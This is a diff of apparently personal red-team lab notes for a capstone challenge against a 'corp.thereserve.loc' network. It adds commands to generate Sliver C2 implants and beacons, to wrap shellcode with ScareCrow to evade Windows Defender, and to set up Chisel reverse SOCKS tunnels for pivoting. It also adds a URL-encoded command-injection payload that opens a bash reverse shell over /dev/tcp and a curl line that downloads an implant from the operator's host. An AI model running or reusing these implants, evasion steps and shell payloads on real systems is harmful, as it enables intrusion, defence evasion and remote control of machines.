@@ -40,6 +40,11 @@ echo "10.200.89.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
 echo "10.200.89.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
 ```
 
+Replace the third octet IPs
+```bash
+sudo sed -i 's/.121./.118./g' /etc/hosts
+sed 's/.117./.103./g' -i internalHosts.txt
+```
 
 Initial
 ```bash
@@ -58,10 +63,15 @@ Silver and EDR bypassing Scarecrow
 // 
 // remember to upx
 // For VPN
-generate --mtls 10.50.110.109:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
-generate beacon --mtls 10.50.110.109:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
-mtls -L 10.50.110.109 -l 11011
-mtls -L 10.50.110.109 -l 11012
+generate --mtls 10.50.99.131:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.99.131:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.99.131 -l 11011
+mtls -L 10.50.99.131 -l 11012
+
+// Server 1
+generate beacon --mtls 10.50.99.131:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+// ScareCrow to bypass Windows Defender - shoot fly with bozaka
+./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
 ```
 
 Chisel Organisation
@@ -71,14 +81,15 @@ export CGO_ENABLED=0
 go build -ldflags="-s -w"
 // Edit proxychains file
 sudo vim /etc/proxychains4.conf
+socks5 $ip $port 
 // VPN chisel server
-./chisel server -p 20000 -reverse -v
+./chisel server -p 20000 -reverse -socks -v
 
 
 // VPN chisel Client - local pivot
-nohup ./chisel client 10.50.110.109:20000 20001:127.0.0.1:20000 &
+nohup ./chisel client 10.50.99.131:20000 20001:127.0.0.1:20000 &
 // 01-09 for individual VPN client pivots, socks, fowards
-nohup ./chisel client 10.50.110.109:20000 R:127.0.01:20002:socks &
+nohup ./chisel client 10.50.99.131:20000 R:127.0.01:20002:socks &
 
 
 // 11-19 for individual * client pivots 
@@ -86,10 +97,10 @@ nohup ./chisel client 10.50.110.109:20000 R:127.0.01:20002:socks &
 nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &
 
 // reverse port forward syntax for the granular needs
-nohup ./chisel client 10.50.110.109:20000 R:127.0.0.1:6379:172.19.0.2:6379 &
+nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1:6379:172.19.0.2:6379 &
 
 // reverse port forward syntax for the granular needs
-nohup ./chisel client 10.50.110.109:20000 R:127.0.0.1: &
+nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1: &
 ```
 
 
@@ -114,6 +125,24 @@ Considerations
 ```
 cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
 ```
+
+```bash
+# http://10.200.121.12/
+mohammad.ahmed@corp.thereserve.loc
+
+```
+
+```bash
+
+
+rlwrap ncat -lvnp 36969 
+;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.114.111/36969+<%261'
+
+curl http://10.50.99.131:8443/VPN-update -o VPN-update
+
+```
+
+
 
 ## Installs
 
